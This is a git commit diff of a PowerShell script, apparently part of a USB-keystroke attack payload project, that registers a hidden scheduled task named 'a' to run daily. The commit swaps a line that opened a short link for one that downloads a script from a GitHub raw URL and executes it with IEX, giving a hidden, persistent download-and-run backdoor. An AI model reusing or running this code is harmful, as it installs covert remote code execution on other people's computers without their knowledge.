c9eddae401a2f5ed4006dfdc3a8ab5a08afb0175
luigit12 <58264257+Luigit12@users.noreply.github.com>
2020-12-13 10:17:06 +0100

    Update scheduler.ps1

--- scheduler.ps1
+++ scheduler.ps1
@@ -1,4 +1,4 @@
 $settings = New-ScheduledTaskSettingsSet -Hidden
-$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'Start-Process https://bit.ly/34niz9I'
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Luigit12/rubduck/master/command.ps1');'
 $trigger = New-ScheduledTaskTrigger -Daily -At 11:00
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'a' -Settings $settings
